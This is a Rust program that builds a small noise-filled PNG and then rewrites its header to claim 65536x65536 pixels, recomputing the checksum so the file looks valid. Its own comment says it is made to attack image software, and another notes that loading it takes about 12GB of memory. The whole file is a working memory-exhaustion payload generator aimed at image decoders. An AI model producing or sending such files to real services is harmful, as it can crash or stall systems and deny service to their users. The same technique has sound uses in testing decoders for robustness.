//! Creates a small image with a manipulated header to attack image software

#![warn(
    absolute_paths_not_starting_with_crate,
    anonymous_parameters,
    box_pointers,
    deprecated_in_future,
    elided_lifetimes_in_paths,
    explicit_outlives_requirements,
    indirect_structural_match,
    keyword_idents,
    macro_use_extern_crate,
    meta_variable_misuse,
    missing_copy_implementations,
    missing_debug_implementations,
    missing_docs,
    missing_doc_code_examples,
    non_ascii_idents,
    private_doc_tests,
    single_use_lifetimes,
    trivial_casts,
    // trivial_numeric_casts,
    unreachable_pub,
    unsafe_code,
    unstable_features,
    unused_extern_crates,
    unused_import_braces,
    unused_lifetimes,
    unused_qualifications,
    unused_results,
    variant_size_differences
)]
#![warn(
    clippy::correctness,
    clippy::restriction,
    clippy::style,
    clippy::pedantic,
    clippy::complexity,
    clippy::perf,
    clippy::cargo,
    clippy::nursery
)]
#![allow(
    clippy::implicit_return,
    clippy::missing_docs_in_private_items,
    clippy::shadow_reuse,
    clippy::similar_names,
    clippy::else_if_without_else,
    clippy::multiple_crate_versions,
    clippy::module_name_repetitions,
    clippy::print_stdout,
    clippy::used_underscore_binding,
    clippy::exit,
    clippy::as_conversions,
    clippy::cast_lossless,
    clippy::float_arithmetic,
    clippy::cast_possible_truncation,
    clippy::cast_sign_loss,
    clippy::indexing_slicing,
    clippy::integer_arithmetic
)]

use common::{Context, Result};
use crc::{crc32, Hasher32};
use image::{png::PNGEncoder, EncodableLayout, ImageBuffer, Pixel, Rgb};
use noise::{Billow, MultiFractal, NoiseFn, Seedable};
use rand::{thread_rng, Rng};
use std::fs;

const WIDTH: u32 = 512;
const HEIGHT: u32 = 512;

// Takes about 12GB of RAM to load
const NEW_WIDTH: u32 = 0x0001_0000;
const NEW_HEIGHT: u32 = 0x0001_0000;

fn create_noise_function() -> Billow {
    let mut rng = thread_rng();

    let seed: u32 = rng.gen();
    let frequency: u8 = rng.gen_range(1, 4);
    let octaves: u8 = rng.gen_range(1, 25);
    let lacunarity: f64 = rng.gen_range(1.0, 2.0);
    let persistence: f64 = rng.gen_range(0.0, 0.5);

    Billow::new()
        .set_seed(seed)
        .set_frequency(frequency as f64)
        .set_octaves(octaves as usize)
        .set_lacunarity(lacunarity as f64)
        .set_persistence(persistence as f64)
}

fn generate_image() -> Result<Vec<u8>> {
    let mut image = ImageBuffer::<Rgb<u8>, Vec<u8>>::new(WIDTH, HEIGHT);
    let noise = create_noise_function();

    for w in 0..WIDTH {
        for h in 0..HEIGHT {
            let nx = w as f64 / WIDTH as f64 - 0.5;
            let ny = h as f64 / HEIGHT as f64 - 0.5;

            let r = noise.get([nx, ny, 0.1]) + 1.0;
            let r = (127.5 * r) as u8;
            let g = noise.get([nx, ny, 0.2]) + 1.0;
            let g = (127.5 * g) as u8;
            let b = noise.get([nx, ny, 0.3]) + 1.0;
            let b = (127.5 * b) as u8;
            image.put_pixel(w, h, Rgb([r, g, b]));
        }
    }
    let mut output: Vec<u8> = Vec::new();
    let encoder = PNGEncoder::new(&mut output);
    encoder
        .encode(
            image.as_bytes(),
            image.width(),
            image.height(),
            Rgb::<u8>::COLOR_TYPE,
        )
        .context("Cannot decode image")?;
    Ok(output)
}

fn extract_u32(data: &[u8], start: usize) -> u32 {
    let mut buf = [0_u8; 4];
    buf.copy_from_slice(&data[start..start + 4]);
    u32::from_be_bytes(buf)
}

fn write_u32(data: &mut [u8], start: usize, val: u32) {
    let bytes = val.to_be_bytes();
    let buf = &mut data[start..start + 4];
    buf.copy_from_slice(&bytes);
}

fn compute_checksum(data: &[u8], start: usize, length: usize) -> u32 {
    let mut digest = crc32::Digest::new(crc32::IEEE);
    digest.write(&data[start..start + length]);
    digest.sum32()
}

fn verify_image(image: &[u8], width: u32, height: u32) {
    assert_eq!(
        [137, 80, 78, 71, 13, 10, 26, 10],
        &image[0..8],
        "PNG Signature is not valid"
    );
    let chunk_length = extract_u32(image, 8);
    let chunk_type = extract_u32(image, 12);
    let img_width = extract_u32(image, 16);
    let img_height = extract_u32(image, 20);

    assert_eq!(0x0000_000d, chunk_length, "Chunk size invalid");
    assert_eq!(0x4948_4452, chunk_type, "Chunk type invalid");
    assert_eq!(width, img_width, "Image width is invalid");
    assert_eq!(height, img_height, "Image height is invalid");

    let data_crc = compute_checksum(image, 12, chunk_length as usize + 4);
    let crc = extract_u32(image, 29);
    assert_eq!(data_crc, crc, "CRC checksum does not match");
}

fn modify_width_and_height(image: &mut [u8], new_width: u32, new_height: u32) {
    write_u32(image, 16, new_width);
    write_u32(image, 20, new_height);

    let chunk_length = extract_u32(image, 8);
    let data_crc = compute_checksum(image, 12, chunk_length as usize + 4);
    write_u32(image, 29, data_crc);
}

fn main() -> Result<()> {
    let mut image = generate_image()?;
    verify_image(&image, WIDTH, HEIGHT);
    modify_width_and_height(&mut image, NEW_WIDTH, NEW_HEIGHT);
    verify_image(&image, NEW_WIDTH, NEW_HEIGHT);
    fs::write("output.png", image).context("Unable to write to image file")?;
    Ok(())
}
